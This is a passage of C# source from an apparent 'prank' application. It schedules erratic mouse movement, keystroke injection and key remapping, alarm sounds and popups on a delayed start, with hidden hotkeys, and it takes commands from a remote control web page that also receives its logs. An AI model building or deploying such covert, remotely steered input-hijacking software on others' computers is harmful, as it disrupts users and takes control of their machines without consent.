            eraticKeyboardThread = new Thread(new ThreadStart(EraticKeyboardThread));
            soundThread = new Thread(new ThreadStart(SoundThread));
            popupThread = new Thread(new ThreadStart(PopupThread));

            GenericsClass.Log("Build Schedule");
            schedule = new EventScheduler<PrankerEvent>();

            //setup delayed start
            if (startDelay > 0)
            {
                _allPrankingEnabled = false;
                schedule.AddEvent(PrankerEvent.StartPranking, startDelay * 1000);
            }

            CreateSchedule(startSchedule, sessionDefaultDurration, true, sessionDefaultStartDelay);

            //upldoad initial schedule and clear outstanding scheduled cmds
            ReadFromCtrlWebPage(true);

            // Start all of the threads
            if (ctrlWebPage != null)
                externalControlThread.Start();
            mouseThread.Start();
            eraticKeyboardThread.Start();
            soundThread.Start();
            popupThread.Start();

            MainBackgroundThread();
        }

        private static void MainBackgroundThread()
        {
            //dont start a new thread, just use the base thread
            while (_applicationRunning)
            {
                try
                {
                    //check for timed events here
                    //act on all scheduled events
                    while (schedule.NextEvent != null && schedule.NextEvent.Time <= DateTime.Now)
                    {
                        ProcessEvent(schedule.NextEvent.Event);
                        schedule.RemoveNextEvent();
                    }

                    Thread.Sleep(_mainThreadPollingInterval);
                }
                catch (Exception e)
                {
                    exceptionCount++;
                    GenericsClass.Log("Exception#" + exceptionCount + " in MainBackgroundThread() - " + e);
                    if (exceptionCount > TollerableExceptionCount)
                        _applicationRunning = false;
                }
            }

            ExitApplication();
        }

        public static void StartPranking()
        {
#if _TESTING
            if (!_allPrankingEnabled)
            {
                GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
                GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
            }
            GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
#endif

            _allPrankingEnabled = true;
        }

        public static void PausePranking()
        {
#if _TESTING
            if (_allPrankingEnabled)
            {
                GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
                GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
            }
            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
#endif

            _allPrankingEnabled = false;
        }

        public static void ExitApplication()
        {

#if _TESTING
            //MessageBox.Show("Exiting application.","\"The\" App",MessageBoxButtons.OK,MessageBoxIcon.None);

            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
#endif

            GenericsClass.Log("Terminating all threads");
            ReadFromCtrlWebPage(true);//try and upload final log
            // Kill all threads and exit application
            mouseThread.Abort();
            eraticKeyboardThread.Abort();
            soundThread.Abort();
            popupThread.Abort();
        }
        #endregion

        #region Events and handling
        static void HotKeyPressed(object sender, HotKeyEventArgs args)
        {
            try
            {
                if (args.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && args.Key == Keys.F2)
                {
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + args.Modifiers + "+" + args.Key + " - Start Pranking");
                    StartPranking();
                }
                else if (args.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && args.Key == Keys.F4)
                {
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + args.Modifiers + "+" + args.Key + " - Stop Pranking");
                    PausePranking();
                }
                else if (args.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && args.Key == Keys.F4)
                {
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + args.Modifiers + "+" + args.Key + " - Kill Application");
                    //stop everything and kill application
                    _applicationRunning = false;
                }
                else if (args.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && args.Key == Keys.D1)
                {
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + args.Modifiers + "+" + args.Key + " - Test Key 1");
                    TestCode1();
                }
                else if (args.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && args.Key == Keys.D2)
                {
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + args.Modifiers + "+" + args.Key + " - Test Key 2");
                    TestCode2();
                }
                else if (keyMapCounter != 0 && !MapKey(args))//try to map this unknown key (combos are ignored)
                {
                    //uncaught hotkey
                    GenericsClass.Log("HotKeyManager_HotKeyPressed() - UnActioned - " + args.Modifiers + "+" + args.Key + "");
                }
            }
            catch (Exception e)
            {
                exceptionCount++;
                GenericsClass.Log("Exception#" + exceptionCount + " in HotKeyPressed(object,HotKeyEventArgs) - " + e);
                if (exceptionCount > TollerableExceptionCount)
                    _applicationRunning = false;
            }
        }

        public static void ProcessEvent(PrankerEvent e)
        {
            bool handled = true;
            switch (e)
            {
                case PrankerEvent.DisableStartup:
                    //TODO handle this case
                    break;
                case PrankerEvent.StartPranking:
                    StartPranking();
                    break;
                case PrankerEvent.PausePranking:
                    PausePranking();
                    break;
                case PrankerEvent.KillApplication:
                    _applicationRunning = false;
                    break;
                case PrankerEvent.StartEraticMouse:
                    _eraticMouseRunning = true;
                    break;
                case PrankerEvent.StopEraticMouse:
                    _eraticMouseRunning = false;
                    break;
                case PrankerEvent.RunEraticMouse5s:
                    _eraticMouseRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 5 * 1000);
                    break;
                case PrankerEvent.RunEraticMouse10s:
                    _eraticMouseRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 10 * 1000);
                    break;
                case PrankerEvent.RunEraticMouse20s:
                    _eraticMouseRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 20 * 1000);
                    break;
                case PrankerEvent.MoveCursorToRandomCorner:
                    GenericsClass.MoveCursorToCorner(GenericsClass.Corner.Random_NotBottomRight);
                    break;
                case PrankerEvent.StartWanderMouse:
                    StartWanderMouse();
                    break;
                case PrankerEvent.StopWanderMouse:
                    _wanderMouseRunning = false;
                    break;
                case PrankerEvent.RunWanderMouse5s:
                    StartWanderMouse();
                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 5 * 1000);
                    break;
                case PrankerEvent.RunWanderMouse10s:
                    StartWanderMouse();
                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 10 * 1000);
                    break;
                case PrankerEvent.RunWanderMouse20s:
                    StartWanderMouse();
                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 20 * 1000);
                    break;
                case PrankerEvent.StartEraticKeyboard:
                    _eraticKeyboardThreadRunning = true;
                    break;
                case PrankerEvent.StopEraticKeyboard:
                    _eraticKeyboardThreadRunning = false;
                    break;
                case PrankerEvent.RunEraticKeyboard5s:
                    _eraticKeyboardThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 5 * 1000);
                    break;
                case PrankerEvent.RunEraticKeyboard10s:
                    _eraticKeyboardThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 10 * 1000);
                    break;
                case PrankerEvent.RunEraticKeyboard20s:
                    _eraticKeyboardThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 20 * 1000);
                    break;
                case PrankerEvent.PlayRandomSound:
                    PlaySound(PrankerSound.Random);
                    break;
                case PrankerEvent.PlaySound_Asterisk:
                    PlaySound(PrankerSound.Asterisk);
                    break;
                case PrankerEvent.PlaySound_Beep:
                    PlaySound(PrankerSound.Beep);
                    break;
                case PrankerEvent.PlaySound_Exclamation:
                    PlaySound(PrankerSound.Exclamation);
                    break;
                case PrankerEvent.PlaySound_Hand:
                    PlaySound(PrankerSound.Hand);
                    break;
                case PrankerEvent.PlaySound_Question:
                    PlaySound(PrankerSound.Question);
                    break;
                case PrankerEvent.PlaySound_Asterisk3X:
                    RepeatEventAfterPause(PrankerEvent.PlaySound_Asterisk,3,1000);
                    break;
                case PrankerEvent.PlaySound_Exclamation3X:
                    RepeatEventAfterPause(PrankerEvent.PlaySound_Exclamation, 3, 1000);
                    break;
                case PrankerEvent.PlaySound_Hand3X:
                    RepeatEventAfterPause(PrankerEvent.PlaySound_Hand, 3, 1000);
                    break;
                case PrankerEvent.PlayBombBeeping:
                    _playBombBeepingNow = true;
                    break;
                case PrankerEvent.CreateRandomPopup:
                    nextPopup = PrankerPopup.Random;
                    break;
                case PrankerEvent.StopMappingAllKeys:
                    DisableKeyMapping();
                    break;
                case PrankerEvent.MapNext1Key:
                    EnableKeyMapping(1);
                    schedule.AddEvent(PrankerEvent.StopMappingAllKeys, KeyMappingMaxDurration, true);
                    break;
                case PrankerEvent.MapNext2Keys:
                    EnableKeyMapping(2);
                    schedule.AddEvent(PrankerEvent.StopMappingAllKeys, KeyMappingMaxDurration, true);
                    break;
                case PrankerEvent.MapNext5Keys:
                    EnableKeyMapping(5);
                    schedule.AddEvent(PrankerEvent.StopMappingAllKeys, KeyMappingMaxDurration, true);
                    break;
                case PrankerEvent.MapNext10Keys:
                    EnableKeyMapping(10);
                    schedule.AddEvent(PrankerEvent.StopMappingAllKeys, KeyMappingMaxDurration, true);
                    break;
                case PrankerEvent.CreateSchedule_SuperEasy:
                    CreateSchedule(PrankerSchedule.SuperEasy);
                    break;
                case PrankerEvent.CreateSchedule_Easy:
                    CreateSchedule(PrankerSchedule.Easy);
                    break;
                case PrankerEvent.CreateSchedule_Medium:
                    CreateSchedule(PrankerSchedule.Medium);
                    break;
                case PrankerEvent.CreateSchedule_Medium_SingleKeySwaps:
                    CreateSchedule(PrankerSchedule.Medium_SingleKeySwaps);
                    break;
                case PrankerEvent.CreateSchedule_Medium_DoubleKeySwaps:
                    CreateSchedule(PrankerSchedule.Medium_DoubleKeySwaps);
                    break;
                case PrankerEvent.CreateSchedule_Medium_PlusSome:
                    CreateSchedule(PrankerSchedule.Medium_PlusSome);
                    break;
                case PrankerEvent.ClearSchedule:
                    schedule.ClearSchedule();
                    break;
                default:
                    handled = false;
                    break;
            }
            if(handled)
                GenericsClass.Log("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e);
            else
                GenericsClass.Log("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e + " - NOT HANDLED");
        }
        
        /// <summary>
        /// List of Events that can occur in this app. NOTE: this is the order that they will be processed
        /// </summary>
        public enum PrankerEvent
        {
            CancelAllNewComands,
            KillApplication,
            DisableStartup, //this is in case I dont want the application to run at all even in the application is launched - must be checked in external source at startup
            
            PausePranking,
            StartPranking,

            CreateSchedule_SuperEasy,
            CreateSchedule_Easy,
            CreateSchedule_Medium,
            CreateSchedule_Medium_SingleKeySwaps,
            CreateSchedule_Medium_DoubleKeySwaps,
            CreateSchedule_Medium_PlusSome,
            ClearSchedule,

            //mouse events
            StartEraticMouse,
            StopEraticMouse,
            RunEraticMouse5s,
            RunEraticMouse10s,
            RunEraticMouse20s,
            StartWanderMouse,
            StopWanderMouse,
            RunWanderMouse5s,
            RunWanderMouse10s,
            RunWanderMouse20s,
            MoveCursorToRandomCorner,

            //keyboard events
            StartEraticKeyboard,
            StopEraticKeyboard,
            RunEraticKeyboard5s,
            RunEraticKeyboard10s,
            RunEraticKeyboard20s,
            StartMappingAllKeys,
            StopMappingAllKeys,
            MapNext1Key,
            MapNext2Keys,
            MapNext5Keys,
            MapNext10Keys,

            //Sound events
            PlayBombBeeping,
            PlayRandomSound,
            PlaySound_Asterisk,
            PlaySound_Beep,
            PlaySound_Exclamation,
            PlaySound_Hand,
            PlaySound_Question,
            PlaySound_Asterisk3X,
            PlaySound_Exclamation3X,
            PlaySound_Hand3X,

            //popup events
            CreateRandomPopup,
        }
        #endregion
    }
}